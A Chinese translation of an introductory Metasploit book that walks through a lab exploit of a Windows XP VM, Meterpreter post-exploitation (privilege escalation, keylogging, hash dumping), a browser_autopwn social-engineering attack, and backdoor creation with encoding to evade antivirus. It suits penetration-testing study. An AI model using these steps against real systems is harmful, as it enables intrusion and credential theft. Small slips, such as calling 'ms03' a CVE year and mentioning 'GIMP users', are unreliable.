# 第一章. 快速入门 Metasploit

欢迎阅读《快速入门 Metasploit》。本书特别为您提供了设置 Metasploit 所需的所有信息。您将学习 Metasploit 的基础知识，开始您的第一个成功利用，并发现一些使用 Metasploit 的技巧。这本入门指南包含以下部分：

《那么，Metasploit 是什么》解释了 Metasploit 实际上是什么，你可以用它做什么，以及为什么它如此伟大。

*安装*解释了如何下载和安装 Metasploit，最小的努力。您还将学习如何在短时间内设置它。

*快速开始-您的第一个利用*将向您展示如何执行 Metasploit 的核心任务之一，即创建您的攻击，然后利用目标。按照步骤利用目标，这将成为您在 Metasploit 中大部分工作的基础。

*您需要了解的顶级功能*将解释如何使用 Metasploit 的最重要功能执行五项任务。在本节结束时，您将能够轻松利用有漏洞的系统并执行后期利用任务。

*您应该了解的人和地方*为您提供了许多有用的链接到项目页面和论坛，以及许多有用的文章、教程、博客，以及 Metasploit 超级贡献者的 Twitter 动态。

# 那么，Metasploit 是什么？

本节概述了渗透测试人员工具箱中 Metasploit 这样的框架的必要性。但在我们深入了解框架之前，让我们先了解框架是如何发展的。以下是本书中经常使用的一些基本概念：

+   **漏洞**：简单来说，漏洞是系统中的一个漏洞。它作为攻击者渗透系统的通道，换句话说就是利用。

+   **利用**：我会递归地定义这个术语，即用于利用有漏洞系统的任何有效代码片段。

+   **有效载荷**：攻击者利用系统是有目的的。因此，成功利用后，他/她打算对系统做什么就是有效载荷。换句话说，有效载荷是与利用捆绑在一起的任何有效代码片段，以帮助攻击者在后期利用阶段。

我在一开始就定义了这些术语，因为这些术语将在本书中经常使用。

在 IT 行业中，我们有各种各样的操作系统，从 Mac、Windows、*nix 平台，到其他服务器操作系统，根据组织的需求运行着许多服务。当给定一个评估任何组织风险因素的任务时，针对这些系统运行单个代码片段变得非常繁琐。如果由于某种硬件故障，所有这些代码片段都丢失了怎么办？Metasploit 登场。

![那么，Metasploit 是什么？](img/4483OT_01_01.jpg)

Metasploit 是一个由 H.D. Moore 于 2003 年创建的利用开发框架，后来被 Rapid7 收购。它基本上是一个用于开发利用并在活动目标上测试这些利用的工具。这个框架完全使用 Ruby 编写，目前是 Ruby 语言中编写的最大的框架之一。该工具库中包含 800 多个利用和每个利用的数百个有效载荷。它还包含各种编码器，可以帮助我们对利用进行混淆，以逃避杀毒软件和其他入侵检测系统（IDS）。随着我们在本书中的进展，我们将揭示这个工具的更多特性。

这个工具可以用于渗透测试、风险评估、漏洞研究，以及其他安全开发实践，比如入侵检测系统（IDS）和入侵预防系统（IPS）。

# 安装

在前一部分，我们简要介绍了 Metasploit 框架。在这一部分，我们将了解 Metasploit 框架的系统要求和各种安装模式。

获取 Metasploit 的最简单方法是下载名为 Backtrack 的 Linux 发行版。Backtrack 是一个基于 Linux 的安全发行版，内置了黑客工具。这些工具从信息收集到网络取证都有。Metasploit 框架属于网络利用类别。Backtrack 将其包含在内，可以直接使用。让我们看看如何做到这一点：

1.  访问网站[`www.backtrack-linux.org`](http://www.backtrack-linux.org)。在该网站的**下载**部分，下载最新版本的 Backtrack 到你的系统上。在这里，你可以选择 ISO 镜像或 VMware 镜像。根据你的需求选择所需的镜像，并允许下载完成。

1.  使用虚拟工作站，如 VMware 或 Virtual Box 打开镜像，让操作系统加载。默认情况下登录凭据是`root`:`toor`。![安装](img/4483OT_02_01.jpg)

1.  一旦你得到了 shell 提示，输入`startx`来加载系统的 GUI。下面的截图显示了 Backtrack 5 的 GUI 的外观：![安装](img/4483OT_02_02.jpg)

Metasploit 有各种不同的版本。在这一部分，我们将看到如何通过命令行控制台调用 Metasploit 框架。

1.  在你的 Backtrack 系统中，点击终端图标打开 shell，如下面的截图所示：![安装](img/4483OT_02_03.jpg)

1.  一旦终端打开，输入`root@bt:~# msfconsole`命令：![安装](img/4483OT_02_04.jpg)

1.  如前面的截图所示，我们已经成功启动了`msfconsole`。截图描述了当前安装在系统上的框架版本。在这里，它是 Metasploit 4.5。

1.  Metasploit 位于 Backtrack 5 R3 的`/opt/metasploit/msf3`文件夹下。如你所见，在这个文件夹下我们有`msfconsole`可执行文件。![安装](img/4483OT_02_05.jpg)

Metasploit 不仅配备了一个命令行界面，而且还有一个非常用户友好的 GUI 叫做**Armitage**。Armitage 是 Metasploit 的一个工具，用于可视化目标并智能推荐基于目标性质的漏洞利用。在这一部分，我们将看到如何在 Backtrack 中启动 Armitage。

1.  导航到 Armitage：**应用程序** | **Backtrack** |**利用工具** | **网络利用工具** | **Metasploit 框架** | **armitage**：![安装](img/4483OT_02_06.jpg)

1.  你将会看到一个对话框。点击**确定**，等待 Armitage 加载到你的 GUI 上。不要改变对话框中的任何值。这可能需要相当长的时间来加载，这是预期的。

1.  在下面的截图中，你可以看到 Armitage——Metasploit 的 GUI 的样子。在接下来的章节中，我们将介绍如何使用 Metasploit 的命令行界面以及 Armitage GUI 来执行攻击。![安装](img/4483OT_02_07.jpg)

在前面的截图中，屏幕的上半部分显示了 Metasploit 框架的文件夹结构。屏幕的下半部分显示了与 GUI 集成的框架的控制台。我们将在接下来的章节中看到如何使用它。

# 快速开始——你的第一个利用！

在*那么，什么是 Metasploit？*部分，我们已经了解了这个工具的演变，在*安装*部分，我们学习了获取这个强大的漏洞利用开发框架的最快最简单的方法。现在你已经安装并运行了 Metaspoit，是时候动手进行第一个实践部分了。在这一部分，我们将通过以下两种方法利用一个有漏洞的 Windows 机器：

+   使用 Metasploit 命令行界面进行利用

+   使用 Metasploit GUI – Armitage 进行利用

## 步骤 1 - 命令行利用

在你的虚拟机中加载 backtrack 5 操作系统，并打开终端。在终端中执行以下命令：

```
root@bt:~ msfconsole

```

`msfconsole`命令会打开 Metasploit 的命令行界面，如下面的截图所示：

![步骤 1 - 命令行利用](img/4483OT_03_01.jpg)

除了 Backtrack，我在我的虚拟机工作站上运行了一个易受攻击的 Windows 机器。让我定义一下这两个角色：

+   攻击者：虚拟机中的 Backtrack 实例是攻击者，Metasploit 是我们的攻击工具

+   受害者：运行在虚拟机上的 Windows XP 易受攻击机器是受害者

众所周知，基于 Windows XP 的系统存在一个易受攻击的 RPC DCOM 组件，容易受到溢出攻击。为了在`metasploit`存储库中搜索这个漏洞，我们将在`msf-terminal`中运行以下命令：

```
root@bt:~search dcom

```

`search dcom`命令搜索所有名称中包含`dcom`子字符串的漏洞。以下截图显示了这次搜索的结果：

![步骤 1 - 命令行利用](img/4483OT_03_02.jpg)

在结果中，我们看到一个名为`exploit/windows/dcerpc/ms03_026_dcom`的条目。文件夹结构告诉我们在 Metasploit 的文件夹结构中漏洞代码的位置。如果我们观察漏洞的名称，我们可以看到它是字母和数字的组合。`ms03`代表了**通用漏洞和暴露**（**CVE**）分配给漏洞的年份，这种情况下是 2003 年的 Microsoft。在得到搜索结果后，我们使用以下命令：

```
root@bt:~use exploit/windows/dcerpc/ms03_026_dcom

```

这将把 Metasploit 的一般终端改为利用特定终端。我们希望进行的任何特定于漏洞的更改都是在这一步完成的。在进行这一步之前，我们需要找出这个特定漏洞的可用选项。以下截图将用于解释：

![步骤 1 - 命令行利用](img/4483OT_03_03.jpg)

你可以在上面的截图中看到我使用了以下命令：

```
root@bt:~show options

```

`show options`命令显示了漏洞的所有可用选项。在这里，**RPORT**（目标端口）默认设置为运行在 Windows 系统上的 RPC 的默认端口。但是，**RHOST**（目标主机）需要我们输入受害者的 IP 地址。我知道我的受害者的 IP 地址是 192.168.252.132。我通过使用`set RHOST ipaddress`命令将这些详细信息提供给 Metasploit：

```
root@bt:~set rhost 192.168.253.132

```

在此之后，你可以执行`show options`命令来查看值并确认它们。在做完所有这些之后，让我们执行`exploit`命令，如下所示：

```
root@bt:~exploit

```

在下面的截图中，我们看到利用成功地打开了一个与受害者的`meterpreter`会话：

![步骤 1 - 命令行利用](img/4483OT_03_04.jpg)

`meterpreter`会话只是攻击者进行后期利用操作的通信渠道，而受害者并不知情。关于这个主题的更多内容将在*The meterpreter module*部分详细介绍。

现在我们已经成功利用了这个简单的漏洞来攻击易受攻击的 XP 系统，让我们了解如何在基于 GUI 的 Armitage 框架上执行类似的攻击。

## 步骤 2 - 基于 GUI 的利用

我们按照*安装*部分的说明加载了 Armitage 框架。在找到漏洞的 CVE 编号后，我们只需在搜索输入框中搜索它，如下面的截图所示：

![步骤 2 - 基于 GUI 的利用](img/4483OT_03_05.jpg)

双击漏洞。攻击设置可以在 UI 上进行，不像在上一节中运行命令。在 UI 上的字段中输入 RHOST 值，并勾选**使用反向连接**框。现在，点击**启动**按钮执行攻击。

![步骤 2 - 基于 GUI 的利用](img/4483OT_03_06.jpg)

以下截图显示它已成功完成了攻击，并且您可以看到围绕 192.xx.xx.132 系统的 UI 的差异。您还可以看到 meterpreter 会话已以与使用命令行利用方法相同的方式打开。

有了这个，我们可以继续更深入的主题和一些基于场景的攻击。Meterpreter 本身将在一个完整的部分中详细介绍，Armitage 也将作为一个单独的部分进行介绍。*快速入门-您的第一个利用*部分是为了给您一个对这个利用框架的预演。

# 您需要了解的顶级功能

在学习了 Metasploit 框架的基础知识之后，在本节中我们将了解 Metasploit 的顶级功能，并学习一些攻击场景。本节将是以下功能的流程：

+   Meterpreter 模块

+   使用 Metasploit 中的辅助模块

+   使用辅助模块进行客户端攻击

## Meterpreter 模块

在之前的部分中，我们已经看到了如何在 Metasploit 中打开一个 meterpreter 会话。但在本节中，我们将详细了解`meterpreter`模块及其命令集的特性。在看到工作示例之前，让我们看看为什么在利用中使用 meterpreter：

+   它不会在目标系统中创建新进程

+   它在被利用的进程的上下文中运行

+   它可以一次执行多个任务；也就是说，您不必为每个单独的任务创建单独的请求

+   它支持脚本编写

正如在*快速入门-您的第一个利用*部分中所看到的，让我们来看看 meterpreter shell 是什么样子的。Meterpreter 允许您提供命令并获取结果。

![The meterpreter module](img/4483OT_04_01.jpg)

让我们看看在 meterpreter 下可用的命令列表。这些可以通过在 meterpreter 命令 shell 中键入`help`来获得。

此命令的语法如下：

```
meterpreter>help

```

以下截图代表核心命令：

![The meterpreter module](img/4483OT_04_02.jpg)

文件系统命令如下：

![The meterpreter module](img/4483OT_04_03.jpg)

网络命令如下：

![The meterpreter module](img/4483OT_04_04.jpg)

系统命令如下：

![The meterpreter module](img/4483OT_04_05.jpg)

用户界面命令如下：

![The meterpreter module](img/4483OT_04_06.jpg)

其他杂项命令如下：

![The meterpreter module](img/4483OT_04_07.jpg)

正如您在前面的截图中所看到的，meterpreter 除了其核心命令集之外，还有两套命令集。它们如下：

+   `Stdapi`

+   `Priv`

`Stdapi`命令集包含各种文件系统命令、网络命令、系统命令和用户界面命令。根据利用的情况，如果可以获得更高的特权，将加载`priv`命令集。默认情况下，无论利用者获得的特权如何，都会加载`stdapi`命令集和`core`命令集。

让我们来看看来自 meterpreter `stdapi`命令集的路由命令。

语法如下：

```
meterpreter>route [–h] command [args] 

```

在下面的截图中，我们可以看到目标机器上所有路由的列表：

![The meterpreter module](img/4483OT_04_09.jpg)

在我们希望添加其他子网和网关的情况下，我们可以使用枢纽的概念，为优化攻击添加一些路由。以下是路由支持的命令：

```
Add [subnet] [netmask] [gateway]
Delete [subnet] [netmask] [gateway] 
List

```

在枢纽过程中有用的另一个命令是端口转发。Meterpreter 支持通过以下命令进行端口转发。

此命令的语法如下：

```
meterpreter>portfwd [-h] [add/delete/list] [args]

```

一旦攻击者侵入任何系统，他/她首先要做的是检查他/她有权访问系统的权限级别。Meterpreter 在侵入系统后提供了一个用于确定特权级别的命令。

此命令的语法如下：

```
meterpreter>getuid

```

以下屏幕截图演示了`getuid`在 meterpreter 中的工作。在下面的屏幕截图中，攻击者正在以`SYSTEM`权限访问系统。在 Windows 环境中，`SYSTEM`权限是可用的最高权限。

![meterpreter 模块](img/4483OT_04_08.jpg)

假设我们未能以`SYSTEM`用户的身份访问系统，但成功以管理员身份访问系统，那么 meterpreter 提供了许多提升访问级别的方法。这被称为**权限提升**。命令如下：

+   **语法**：`meterpreter>getsystem`

+   **语法**：`meterpreter>migrate process_id`

+   **语法**：`meterpreter>steal_token process_id`

第一种方法使用 meterpreter 内部程序来获取系统访问权限，而在第二种方法中，我们正在迁移到以`SYSTEM`权限运行的进程。在这种情况下，漏洞默认加载到 Windows 操作系统的任何进程空间中。但是，用户始终有可能通过从进程管理器中删除该进程来清除该进程空间。在这种情况下，迁移到通常不受用户触及的进程是明智的。这有助于保持对受害者机器的长期访问。在第三种方法中，我们实际上是在模拟一个以`SYSTEM`特权进程运行的进程。这被称为**通过令牌窃取进行模拟**。

基本上，Windows 为用户分配了一个称为**安全标识符**（**SID**）的唯一 ID。每个线程都持有一个包含有关权限级别信息的令牌。当一个特定的线程暂时承担同一系统中另一个进程的身份时，就会发生令牌模拟。

我们已经在前面的命令中看到了进程 ID 的用法，但是我们如何获取进程 ID 呢？这正是我将在本节中介绍的内容。Windows 运行各种进程，而利用漏洞本身将在 Windows 系统的进程空间中运行。为了列出所有这些进程及其 PID 和权限级别，我们使用以下 meterpreter 命令：

```
meterpreter>ps

```

以下屏幕截图清楚地展示了`ps`命令的工作情况：

![meterpreter 模块](img/4483OT_04_10.jpg)

在前面的屏幕截图中，我们列出了 PID。我们可以使用这些 PID 来提升我们的权限。一旦你窃取了一个令牌，可以使用`Drop_token`命令来丢弃它。

该命令的语法如下：

```
meterpreter>drop_token

```

stdapi 集中另一个有趣的命令是`shell`命令。这在目标系统中生成一个 shell，并使我们能够轻松地浏览系统。

该命令的语法如下：

```
meterpreter>shell

```

以下屏幕截图显示了 shell 命令的用法：

![meterpreter 模块](img/4483OT_04_11.jpg)

前面的屏幕截图显示我们在目标系统内部。所有通常的 Windows 命令 shell 脚本，如`dir`、`cd`和`md`在这里都可以使用。

简要介绍了系统命令后，让我们开始学习文件系统命令。文件系统包含一个工作目录。为了找出目标系统中的当前工作目录，我们使用以下命令：

```
meterpreter>pwd

```

以下屏幕截图显示了该命令的使用情况：

![meterpreter 模块](img/4483OT_04_12.jpg)

假设你想在目标系统上搜索不同的文件，那么我们可以使用一个名为`search`的命令。该命令的语法如下：

```
meterpreter> search [-d dir][-r recurse] –f pattern

```

搜索命令下可用的各种选项包括：

+   `-d`：这是开始搜索的目录。如果未指定任何内容，则搜索所有驱动器。

+   `-f`：我们想要搜索的模式。例如，`*.pdf`。

+   `-h`：提供帮助上下文。

+   `-r`：当我们需要递归搜索子目录时使用。默认情况下，这是设置为 true 的。

一旦我们得到所需的文件，我们使用`download`命令将其下载到我们的驱动器上。

该命令的语法如下：

```
meterpreter>download Full_relative_path

```

到目前为止，我们已经涵盖了核心命令、系统命令、网络命令和文件系统命令。`stdapi`命令集的最后一部分是用户界面命令。最常用的命令是`keylogging`命令。这些命令在嗅探用户帐户凭据方面非常有效：

+   **语法**：`meterpreter>keyscan_start`

+   **语法**：`meterpreter>keyscan_dump`

+   **语法**：`meterpreter>keyscan_stop`

这是使用该命令的过程。以下截图解释了命令的执行过程：

![meterpreter 模块](img/4483OT_04_13.jpg)

meterpreter 与其目标之间的通信是通过类型-长度-值进行的。这意味着数据以加密方式传输。这导致了多个通信通道。这样做的好处是多个程序可以与攻击者进行通信。通道的创建在以下截图中有所说明：

![meterpreter 模块](img/4483OT_04_14.jpg)

该命令的语法如下：

```
meterpreter>execute process_name –c

```

`-c`是告诉 meterpreter 通道输入/输出的参数。当攻击需要我们与多个进程进行交互时，通道的概念就成为攻击者的有用工具。`close`命令用于退出通道。

## Metasploit 中的辅助模块

辅助模块不是利用，而是帮助攻击者在渗透测试场景中执行各种任务。它包括扫描、DoS 攻击和模糊测试。在本节中，我们将探讨这个模块。辅助模块分为各种类别，详细如下：

+   **拒绝服务**（**DoS**）

这提供了一系列工具，用于执行拒绝服务攻击。

+   **模糊测试器**

模糊测试是另一种有助于确定潜在可利用目标的重要方法。该辅助模块为攻击者提供各种模糊测试脚本，用于自动化攻击。

+   **收集**

信息收集是一项非常重要的任务。众所周知，黑客的循环始于信息收集，关于目标的信息永远不会太多。我们能够收集的信息越多，我们的攻击就会越接近和更有效。

+   **扫描器**

网络扫描紧随信息收集阶段。作为攻击者，掌握网络布局总是有利的，以便规划进入和退出点。如果我们希望在攻击中包含枢纽概念以深入目标网络，这也会有所帮助。

+   **欺骗**

欺骗是在目标系统中获得提升权限的一种方式。Metasploit 框架中提供的这些模块帮助我们做到这一点。这些模块还可以在中间人攻击中帮助我们，其中欺骗是成功攻击的关键。

+   **VOIP**

如果我们能够嗅探流量，语音 IP 设备会给我们提供非常有价值的信息。该类别中的辅助模块帮助我们轻松利用 VOIP 设备。

+   **Wi-Fi**

各种 Wi-Fi 热点，如咖啡馆和机场，为攻击者提供了一个完美的游乐场。在这些地方使用互联网的无辜人们可以通过这些辅助模块被攻击。

上述列表并不限于此，只是为我们提供了一个关于 Metasploit 作为利用框架时如何通过这些额外工具给予攻击者权力的想法。

为了对目标进行简单的 TCP 扫描，我们可以使用以下辅助模块：

+   **语法**：`msf>use auxiliary/scanner/portscan/tcp`

+   **语法**：`auxiliary(tcp)>show options`

如前所述，`show options`命令可用于了解该模块的要求，以成功执行它。

![Metasploit 中的辅助模块](img/4483OT_04_15.jpg)

RHOST 是我们需要提供的目标 IP。因此，我们将 RHOST 设置为目标系统 IP，如前几节所述。默认情况下，详细模式为 false，如果我们将其更改为 true，那么扫描器的活动量将呈指数级增加。因此，在下面的屏幕截图中，我们看到详细模式为 false，扫描是在前 150 个端口上进行的：

![Metasploit 中的辅助模块](img/4483OT_04_16.jpg)

假设我们有兴趣查找网络中正在运行的主机；值得进行 ARP 扫描，以便我们了解网络中的活动主机。需要在这个辅助模块中传递的参数是远程主机、源主机和源主机的 MAC 地址。要指定要扫描的 IP 范围，我们遵循以下语法：

```
auxiliary(tcp)>set RHOSTS 192.x.x.x/y

```

最后一部分中的`x/y`范围通知扫描器，`x`是范围的起始 IP，`y`是范围的结束 IP。这类似于 Nmap 扫描器。

辅助模块有各种可用于执行外围任务的脚本，如信息收集和扫描。在实时渗透测试的场景中，这些非常有用。本节证明了 Metasploit 框架实际上是多么强大和可扩展，使其成为学习渗透测试基础知识的一站式商店。

## 使用辅助模块进行客户端攻击

当受害者处于 NAT/防火墙后面时，不可能通过开放端口直接利用系统。在这种情况下，我们需要使用经典的社会工程攻击来利用一些其他应用程序，如浏览器和插件，以获得对系统的访问。在这个视频中，我们将看到辅助模块的服务器类别。用于此攻击的模块是 metasploit 提供的经典`browser_autopwn`脚本。

该命令的语法如下：

```
msf>use auxiliary/server/browser_autopwn

```

在这种情况下，我们将托管一个恶意服务器，等待传入连接。攻击将通过社会工程以 URL 的形式发送，用户需要在浏览器中打开。我们的服务器预先加载了一组可用的基于浏览器的利用程序，并等待连接。一旦单击 URL 并建立连接，它会尝试向用户正在浏览 URL 的浏览器注入各种数据包。反过来，它利用已知的浏览器漏洞，使我们完全控制目标系统。

通常情况下，一旦我们进入一个利用模块，我们就会检查需要输入的选项。在这个辅助模块中提供的选项如下：

+   `LHOST` - 攻击者机器的 IP 地址

+   `SRVHOST` - 通常默认设置为 0.0.0.0

+   `SRVPORT` - 攻击者机器上监听传入连接的本地端口

+   `SSL` - 切换 true 或 false 以启用 SSL 连接

+   `SSL 证书` - 如果托管网页，则可以提供要使用的 SSL 证书的路径

+   `SSL 版本` - 默认情况下使用 SSL3

+   `URIPATH` - `URIPATH`指定了攻击 URL 的格式

让我们看看执行攻击所需设置的值。如下屏幕截图所示：

![使用辅助模块进行客户端攻击](img/4483OT_04_17.jpg)

在上面的屏幕截图中，您可以详细了解设置。我们已将 SRV 端口设置为 80，这是默认的 HTTP 端口。这将避免任何关于链接威胁的疑虑。设置 URIPATH 为`/`也是同样的道理，因为这个选项使 URL 成为一个简单的 URL，而不是附加一些无意义的字母。我们还将 LHOST 设置为攻击者机器的 IP，在这种情况下是我们自己的机器。

这些命令的语法如下：

+   `msf auxiliary(browser_autopwn)>set lhost ip_address`

+   `msf auxiliary(browser_autopwn)>set srvport port_number`

+   `msf auxiliary(browser_autopwn)>set URIPATH /`

+   `msf auxiliary(browser_autopwn)>exploit`

一旦我们完成设置数值，就该运行`exploit`命令了。以下截图显示，利用服务器加载自身的利用脚本后，准备就绪！

![辅助模块的客户端攻击](img/4483OT_04_18.jpg)

当用户在浏览器中点击链接时，利用开始工作并为我们执行利用。在下面的截图中，你可以看到 meterpreter 通道已打开，让我们可以访问受害者。这种攻击是客户端的利用，而不是直接的系统利用。这需要与受害者/目标的互动，这构成了攻击的大部分。攻击者的社会工程学艺术将在这次攻击中得到考验，以使受害者点击提供的链接。游戏只有在受害者点击链接时才结束。

![辅助模块的客户端攻击](img/4483OT_04_19.jpg)

一旦受害者点击链接，我们就会看到屏幕上出现了很多活动，如截图所示：

![辅助模块的客户端攻击](img/4483OT_04_20.jpg)

在前面的截图中，我们可以看到一些利用未能成功工作。当我们仔细观察它们时，我们可以看到它们中出现了“firefox”一词。这意味着用户在非 Firefox 环境中点击了这个链接。我用 Windows Internet Explorer 来演示这个练习。

我们在这个模块中观察到的另一个有趣的事情是，一旦利用成功，利用就会迁移到`notepad.exe`。这是因为在这样的攻击中，用户重新启动浏览器的可能性很高，因为用户会有一个无限的页面加载等待时间，他/她甚至可能会尝试关闭标签页。在这种情况下，我们不希望失去我们成功获得的与该系统的连接。因此，辅助模块足够智能，可以考虑到这一点，并将自己迁移到后台的更安全的进程，如`notepad.exe`或类似的进程。

一旦你掌握了 meterpreter 会话，你就知道你应该做什么！我们在前面的章节中详细介绍了 meterpreter。

### 在 Metasploit 中创建后门

当我们尝试设置第一个利用时，我们看到了很多有效载荷。这让我想，如果我们能找到一种方法来独立于利用附加这些有效载荷，并利用社会工程学来获取更多的目标，那么我的攻击成功率将会提高。为了回答这些祈祷，Metasploit 通过一个名为`msfpayload`的脚本拯救了这一天！

导航到`/opt/metasploit/msf3/`。在这里，你会找到一个名为`msfpayload`的可执行脚本。使用`msfpayload`，我们可以创建一个恶意的二进制文件，然后将其给受害者，帮助我们利用他/她的系统。

### 转储 Windows 哈希

在后期利用中，如果我们希望获取系统中所有登录用户的用户名和密码，那么我们需要转储这些哈希。为此，我们在 meterpreter 模块中有一个脚本。命令的名称是`hashdump`。

该命令的语法如下：

```
meterpreter>hashdump

```

以下截图解释了命令的执行过程：

![转储 Windows 哈希](img/4483OT_04_21.jpg)

转储这些哈希后，我们可以使用类似 John the Ripper 的工具来破解密码。

### 使用第三方工具窃取浏览器凭据

我们已经看到了在目标上创建通道和执行远程系统中的进程的概念。我们还在 meterpreter 中看到了上传/下载命令。使用这些概念，如果我们可以上传一个像`firepassword`这样的 EXE 文件，它可以窃取 Firefox 浏览器中保存的凭据，那么这将增加我们从系统到他们的在线足迹的攻击范围。

![使用第三方工具窃取浏览器凭据](img/4483OT_04_22.jpg)

本节涵盖了作为初学者需要了解的主要功能。我相信从这一点开始，你可以在这里和那里的一点指导下自己探索 Metasploit。本节的唯一目的是为您提供所需的起步，以便使用该工具。

## 社会工程工具包- Metasploit 的扩展

到目前为止，我们在本书中已经涵盖了 Metasploit 的各个方面。在本节中，让我们将知识扩展到与社会工程工具包一起使用的 Metasploit 扩展。社会工程是一种利用人类思维的经典方法。目标可能使用任何高级安全工具和防御来保护自己免受攻击者的攻击，但众所周知，一个组织的安全程度取决于其最薄弱的环节。更有趣的是，人类愚蠢是永远无法修补的。社会工程工具包促进了这类攻击，这些攻击需要一个安全意识的人类思维来进行防御；如果没有，任何防御机制都无法阻止攻击。

当我们打开社会工程工具包时，我们会看到以下截图中的各种选项：

![社会工程工具包- Metasploit 的扩展](img/4483OT_04_23.jpg)

让我们枚举一下这个框架下可用的选项：

+   **社会工程攻击**：这类攻击包括各种子类别，如鱼叉式网络钓鱼攻击、网站攻击、制作媒体有效负载、大规模邮件攻击、短信欺骗攻击、基于 QR 码的攻击等。在鱼叉式网络钓鱼攻击中，我们有一个单一目标，攻击就像我们扔鱼叉捕捉鱼一样，因此得名；鱼叉式网络钓鱼。在制作媒体有效负载中，我们基本上使用 MP3/音频格式或视频、PPTX 文件、PDF 等发送给受害者。这些将绑定后门以授予对远程系统的访问权限。当然，在发送受感染的媒体文件之前，还会对有效负载进行混淆，以便逃避 IDS/IPS 和防病毒系统。

+   **快速攻击模块**：这是与以前的快速渗透测试平台集成。社会工程工具包现在也将这些平台纳入其旗下。

+   **第三方模块集成**：这个模块下有两种攻击；著名的基于 Java 小程序的利用和基于 Tommy Edition 的远程管理工具。

+   社会工程工具包还可以用于更新 Metasploit 框架，除了本书中之前介绍的`msfupdate`命令。

Metasploit 扩展可以在**创建有效负载**子选项下的社会工程攻击菜单中找到。在下面的截图中，我们可以看到基于 meterpreter 的扩展有效负载在社会工程工具包下。在攻击目标时，使用这些的方式仍然是使用常规的 Metasploit 框架命令。

![社会工程工具包- Metasploit 的扩展](img/4483OT_04_24.jpg)

### 在攻击中使用 msfencode 脚本

我想简要介绍一下 Metasploit 框架中可用的 msfencode。msfpayload 脚本可用于创建恶意可执行文件，但为了使其逃避 IPS/IDS 和防病毒系统，我们需要使用编码器对有效负载进行编码/混淆。Msfencode 通过提供各种编码选项来为我们执行任务。

### Nmap 和 Metasploit

Nmap 本身是一个独立的工具，但也可以在 Metasploit 中调用，进行快速端口扫描。例如：

+   **语法**：`msf>nmap –sV ip_address`

+   **语法**：`msf>nmap –O ip_address`

第一个命令扫描目标系统上运行的端口的服务，而第二个命令抓取目标系统的横幅。

# 你应该了解的人和地方

如果您需要有关 Metasploit 的帮助，以下是一些对您非常有价值的人和地方。

## 官方网站

+   主页：[`www.metasploit.com/`](http://www.metasploit.com/)

+   手册和文档：[`help.metasploit.com/`](http://help.metasploit.com/)

+   Wiki：[`wiki.backbox.org/index.php/Metasploit`](http://wiki.backbox.org/index.php/Metasploit)

+   博客：[`community.rapid7.com/community/metasploit/blog`](https://community.rapid7.com/community/metasploit/blog)

+   源代码：[`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework)

## 文章和教程

网络上有无数的教程和文章涵盖了 Metasploit 的各个方面。您可以在搜索引擎（Google、Bing 和 Yahoo）上搜索特定的任务，并可能最终访问到一些令人兴奋的网站，上面清晰地解释了如何执行这些任务。Metasploit 用户随处可见，他们在网络上发布的内容包括图片相册、源代码，还有视频教程。以下是一些对 GIMP 用户来说可能熟悉的网站：

+   [`www.offensive-security.com/metasploit-unleashed/Main_Page`](http://www.offensive-security.com/metasploit-unleashed/Main_Page)

+   [`backtracktutorials.com/metasploit-tutorial/`](http://backtracktutorials.com/metasploit-tutorial/)

+   [`www.securitytube.net/video/1175`](http://www.securitytube.net/video/1175)（*Metasploit Mega primer*, *Vivek Ramachandra*）

## 社区

如果您想参与 Metasploit，这些链接对您会很有用：

+   官方邮件列表：[`mail.metasploit.com/mailman/listinfo/framework`](http://mail.metasploit.com/mailman/listinfo/framework)

+   官方论坛：[`community.rapid7.com/welcome`](https://community.rapid7.com/welcome)

+   非官方论坛：[`www.backtrack-linux.org/forums/forum.php`](http://www.backtrack-linux.org/forums/forum.php)

+   官方 IRC 频道：[`community.rapid7.com/docs/DOC-2198`](https://community.rapid7.com/docs/DOC-2198)

+   用户常见问题：[`en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions`](http://en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions)

## Twitter

如果您是 Twitter 用户，我必须提到这些 Twitter 页面：

+   [`twitter.com/metasploit`](https://twitter.com/metasploit)

+   [`twitter.com/hdmoore`](https://twitter.com/hdmoore)

+   [`twitter.com/rapid7`](https://twitter.com/rapid7)

+   [`twitter.com/Backtrack5`](https://twitter.com/Backtrack5)

要获取更多开源信息，请关注 Packt：[`twitter.com/#!/packtopensource`](http://twitter.com/#!/packtopensource)。
